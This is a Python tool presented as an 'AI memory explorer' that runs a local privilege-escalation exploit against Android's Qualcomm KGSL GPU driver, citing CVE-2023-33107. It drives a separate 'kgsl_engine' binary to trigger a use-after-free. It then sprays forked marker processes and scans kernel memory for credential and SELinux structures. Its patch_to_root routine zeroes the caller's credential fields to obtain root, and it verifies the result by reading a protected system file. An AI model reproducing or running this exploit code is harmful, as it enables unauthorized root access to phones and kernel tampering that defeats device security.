import os
import sys
import time
import struct
import subprocess
import platform

class MemoryExplorerAI:
    def __init__(self):
        self.found_items = []
        self.spray_procs = []
        self.exploit_proc = None
        
        # Paths
        base_dir = os.path.dirname(os.path.abspath(__file__))
        self.engine_path = os.path.join(base_dir, "kgsl_engine")
        
        self.uaf_start = 0x7001ff000
        self.uaf_size = 0x10000000 # 256MB
        
        # AI Heuristics Database
        self.system_signatures = {
            "com.android.settings": "Android Settings (Security)",
            "com.android.systemui": "System UI (Core)",
            "com.android.camera": "Camera Driver Context",
            "com.android.gallery3d": "Gallery Media Service",
            "com.android.deskclock": "System Clock / Alarm",
            "com.android.contacts": "Contacts Database",
            "com.google.android.gms": "Google Play Services",
            "com.asus.launcher": "ASUS Launcher (Shell)",
            "ru.rustore.sdk": "RuStore SDK Instance",
            "system_server": "Kernel System Server",
            "surfaceflinger": "Display Compositor"
        }
        
        self.kernel_signatures = {
            b"KETO0422": "task_struct (Exploit Marker)",
            b"init_cred": "Global Root Credentials",
            b"selinux_enforcing": "SELinux Enforcing State",
            b"\x7fELF": "Kernel Binary (ELF Header)",
            b"\xfd\x7b\xbf\xa9": "AArch64 Function Prologue"
        }

    def get_ram_usage(self):
        try:
            with open('/proc/meminfo', 'r') as f:
                lines = f.readlines()
                total = int(lines[0].split()[1])
                available = int(lines[2].split()[1])
                return 100.0 * (1 - (available / total))
        except: return 0.0

    def read_page(self, va):
        try:
            cmd = [self.engine_path, "read", hex(va)]
            data = subprocess.check_output(cmd, stderr=subprocess.DEVNULL)
            return data
        except: return None

    def write_page(self, va, data):
        try:
            cmd = [self.engine_path, "write", hex(va)]
            proc = subprocess.Popen(cmd, stdin=subprocess.PIPE, stderr=subprocess.DEVNULL)
            proc.communicate(input=data)
            return proc.returncode == 0
        except: return False

    def classify_page(self, page_data, va):
        """
        AI Heuristic Engine: Classifies memory content based on weights
        """
        score = 0.0
        best_guess = {"type": "Raw Data", "desc": "Unknown Memory Region", "conf": 0.0}

        # 1. Check for String Signatures (System Apps)
        for sig, name in self.system_signatures.items():
            if sig.encode() in page_data:
                return {"type": "System App", "desc": name, "conf": 1.0, "data": page_data, "va": hex(va)}

        # 2. Check for Kernel Markers
        for sig, name in self.kernel_signatures.items():
            if sig in page_data:
                return {"type": "Kernel Core", "desc": name, "conf": 0.95, "data": page_data, "va": hex(va)}

        # 3. Check for UID/GID patterns (UID 1000 = system)
        uid_pattern = struct.pack("<IIII", 1000, 1000, 1000, 1000)
        if uid_pattern in page_data:
            return {"type": "Privilege Struct", "desc": "System Credentials (UID 1000)", "conf": 0.85, "data": page_data, "va": hex(va)}

        # 4. Check for AArch64 Code Patterns
        if b"\xfd\x7b" in page_data[:128]: # Common stack frame setup
            return {"type": "Executable", "desc": "AArch64 Code Segment", "conf": 0.70, "data": page_data, "va": hex(va)}

        return {"type": "Data", "desc": "Random Buffer / Cache", "conf": 0.1, "data": page_data, "va": hex(va)}

    def translate_logic(self, item):
        """
        AI Translation: Explains the bytes in human words
        """
        data = item['data']
        desc = item['desc']
        
        if "task_struct" in desc:
            pid_off = 0x548
            pid = struct.unpack("<I", data[pid_off:pid_off+4])[0] if len(data) > pid_off+4 else 0
            return f"This is a Process Descriptor for PID {pid}. It contains pointers to CPU registers, stack, and security credentials (cred)."
        elif "cred" in desc or "Credentials" in desc:
            uid = struct.unpack("<I", data[4:8])[0] if len(data) > 8 else -1
            return f"Security Credentials structure. Current UID is {uid}. Patching the first 32 bytes to zero will grant full ROOT permissions."
        elif "ELF" in desc:
            return "Kernel Image Header. This is the 'Base' of the operating system code. Useful for calculating offsets for all other functions."
        elif "Settings" in desc:
            return "Android Settings process memory. Likely contains developer mode flags, ADB status, and security policy caches."
        elif "Code" in desc:
            return "Executable machine code. These are instructions for the CPU. Can be modified to hijack program flow (Function Hooking)."
        
        return "Generic memory buffer. Contains unstructured data used by system services or applications."

    def render_tui(self):
        os.system('clear')
        ram = self.get_ram_usage()
        print("="*85)
        print(f" KGSL AI MEMORY EXPLORER | Status: {'ACTIVE' if self.exploit_proc else 'IDLE'} | RAM: {ram:.1f}%")
        print("="*85)
        
        print(" [FILE MANAGER VIEW] - Memory Regions Found:")
        print("-" * 85)
        print(f" {'ID':<3} | {'TYPE':<18} | {'IDENTIFIED AS':<35} | {'VA ADDRESS':<12}")
        print("-" * 85)
        
        for i, item in enumerate(self.found_items):
            print(f" [{i:02d}] | {item['type']:<18} | {item['desc']:<35} | {item['va']:<12}")
        
        if not self.found_items:
            print(f" {'(No items found yet. Trigger [E] and Scan [S] to populate)':^80}")
            
        print("\n" + "="*85)
        print(" [E] Exploit Trigger   [P] Spray Markers   [S] Start AI Scan   [C] Clear Memory")
        print(" [R] Verify Root       [B] Rebuild Engine  [Q] Exit Explorer   [ID] Open File")
        print("="*85)

    def show_detail(self, idx):
        if idx >= len(self.found_items): return
        item = self.found_items[idx]
        data = item['data']
        
        while True:
            os.system('clear')
            print(f"=== [FILE VIEW: {item['va']}] ===")
            print(f" Classification: {item['type']}")
            print(f" Identification: {item['desc']} (Confidence: {item['conf']*100:.1f}%)")
            print("-" * 75)
            
            print(" [AI LOGIC TRANSLATION]:")
            print(f" >> {self.translate_logic(item)}")
            print("-" * 75)
            
            print(" [BIOS-STYLE HEX/BINARY DUMP]:")
            for i in range(0, min(len(data), 128), 16):
                chunk = data[i:i+16]
                hex_str = " ".join(f"{b:02X}" for b in chunk)
                # Binary for first 4 bytes of each line
                b_val = struct.unpack("<I", chunk[:4])[0]
                bin_str = bin(b_val)[2:].zfill(32)
                print(f" {i:04X}: {hex_str:<48} | BIN: {bin_str[:8]}...")
            
            print("-" * 75)
            print(" [P] Patch to Root    [N] Scan Neighbors    [Enter] Back to List")
            
            choice = input("\n explorer > ").lower()
            if not choice: break
            if choice == 'p':
                self.patch_to_root(int(item['va'], 16))
                input("Press Enter...")
            elif choice == 'n':
                print("[*] Reading adjacent memory...")
                # Logic for neighbors here...
                time.sleep(1)

    def patch_to_root(self, va):
        print(f"[*] AI attempting to elevate privileges via {hex(va)}...")
        page_data = self.read_page(va)
        if not page_data: return
        
        my_uid = os.getuid()
        uid_bytes = struct.pack("<I", my_uid)
        new_data = bytearray(page_data)
        
        found = False
        for i in range(0, len(page_data) - 32, 4):
            if page_data[i:i+4] == uid_bytes:
                print(f"[+] AI Target Found: UID {my_uid} at +0x{i:x}. Overwriting with UID 0 (ROOT).")
                for j in range(8): # Zero out all credential fields
                    new_data[i+j*4 : i+j*4+4] = b"\x00\x00\x00\x00"
                found = True
                break
        
        if found:
            if self.write_page(va, bytes(new_data)):
                print("[+++] AI SYSTEM: Privilege Escalation Success! System identity spoofed to ROOT.")
            else:
                print("[-] AI SYSTEM: Hardware Write Error. GPU bus busy.")
        else:
            print("[-] AI SYSTEM: UID pattern not matched. Structure might be encrypted or shifted.")

    def trigger_exploit(self):
        if self.exploit_proc: return
        print("[*] Initializing Hardware Trigger (CVE-2023-33107)...")
        self.exploit_proc = subprocess.Popen([self.engine_path, "exploit"], stdout=subprocess.PIPE, text=True)
        for line in self.exploit_proc.stdout:
            if "UAF_READY" in line:
                print("[+] Hardware Access: OPEN.")
                break
        time.sleep(1)

    def run_spray(self, count=3000):
        print(f"[*] Creating {count} Process Markers for AI recognition...")
        for i in range(count):
            pid = os.fork()
            if pid == 0:
                try:
                    import ctypes
                    libc = ctypes.CDLL(None)
                    libc.prctl(15, f"KETO{i:04d}".encode(), 0, 0, 0)
                except: pass
                while True: time.sleep(100)
            else: self.spray_procs.append(pid)
        print(f"[+] Memory Spraying complete.")
        time.sleep(1)

    def try_compile_engine(self):
        source = self.engine_path + ".c"
        if not os.path.exists(source): return False
        print(f"[*] Compiling AI Engine for {platform.machine()}...")
        for comp in ["gcc", "clang"]:
            try:
                subprocess.check_call([comp, "-O2", source, "-o", self.engine_path, "-lpthread"])
                print(f"[+] Engine built with {comp}.")
                return True
            except: continue
        return False

    def check_root(self):
        print("\n[*] Root Verification Protocol:")
        try:
            res = subprocess.check_output(["id"], text=True).strip()
            print(f" >> Identity: {res}")
            try:
                with open("/data/system/packages.list", "r") as f:
                    f.read(1)
                print(" >> Access Test: SUCCESS (Full System Access)")
            except: print(" >> Access Test: FAILED (SELinux or UID mismatch)")
        except Exception as e: print(f" [-] Verification Error: {e}")
        input("\nPress Enter...")

    def run(self):
        if not os.path.exists(self.engine_path): self.try_compile_engine()
        
        while True:
            self.render_tui()
            try: cmd = input("\n explorer > ").lower()
            except EOFError: break
            
            if cmd == 'q':
                if self.exploit_proc: self.exploit_proc.terminate()
                for p in self.spray_procs:
                    try: os.kill(p, 9)
                    except: pass
                break
            elif cmd == 'e': self.trigger_exploit()
            elif cmd == 'p': self.run_spray()
            elif cmd == 'c':
                for p in self.spray_procs:
                    try: os.kill(p, 9)
                    except: pass
                self.spray_procs = []
            elif cmd == 'r': self.check_root()
            elif cmd == 'b': self.try_compile_engine(); input("Press Enter...")
            elif cmd == 's':
                if not self.exploit_proc:
                    print("[!] Trigger [E] first!"); time.sleep(1); continue
                print("[*] AI Scanning Memory for Patterns...")
                scan_cmd = [self.engine_path, "scan", hex(self.uaf_start), hex(self.uaf_start + self.uaf_size)]
                proc = subprocess.Popen(scan_cmd, stdout=subprocess.PIPE, text=True)
                try:
                    for line in proc.stdout:
                        if "MATCH_" in line:
                            va = int(line.split(":")[1], 16)
                            data = self.read_page(va)
                            if data:
                                self.found_items.append(self.classify_page(data, va))
                                self.render_tui()
                except KeyboardInterrupt: proc.terminate()
            elif cmd.isdigit():
                self.show_detail(int(cmd))

if __name__ == "__main__":
    explorer = MemoryExplorerAI()
    explorer.run()
